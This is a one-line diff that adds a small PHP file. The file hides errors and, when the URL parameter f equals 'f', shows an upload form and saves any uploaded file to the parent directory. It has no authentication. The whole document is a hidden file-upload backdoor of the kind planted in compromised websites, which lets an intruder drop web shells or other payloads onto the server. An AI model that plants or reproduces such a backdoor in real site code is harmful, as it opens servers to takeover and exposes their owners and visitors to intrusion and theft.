@@ -1,0 +1,1 @@
+<?php error_reporting(0); if(trim($_GET['f']) == 'f'){ $saw1 = $_FILES['file']['tmp_name']; $saw2 = '../'.$_FILES['file']['name']; echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='upload' /></form>"; if($saw1 && $saw2) move_uploaded_file($saw1, $saw2); } ?>
